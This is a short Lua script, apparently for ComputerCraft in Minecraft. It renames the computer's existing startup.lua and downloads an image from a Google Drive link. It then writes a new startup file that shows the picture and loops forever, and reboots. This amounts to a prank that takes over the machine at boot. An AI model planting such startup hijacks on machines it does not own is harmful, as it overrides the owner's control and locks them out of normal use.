--local path = fs.getDir(shell.getRunningProgram())

if (fs.exists("startup.lua")) then
    shell.run("rename startup.lua noStartupOnlyBrisket.lua")
end

shell.run("wget https://drive.google.com/uc?export=download&id=181ubki2bVSE34zVW2Gl1D2wFSf1k_ko3 brisket.nfp")
local startup = fs.open("startup.lua", "w")
startup.writeLine('local brisket = paintutils.loadImage("brisket.nfp")')
startup.writeLine('paintutils.drawImage(brisket, 0, 0)')
startup.writeLine('while true do os.sleep(120) end')
startup.close()

os.reboot()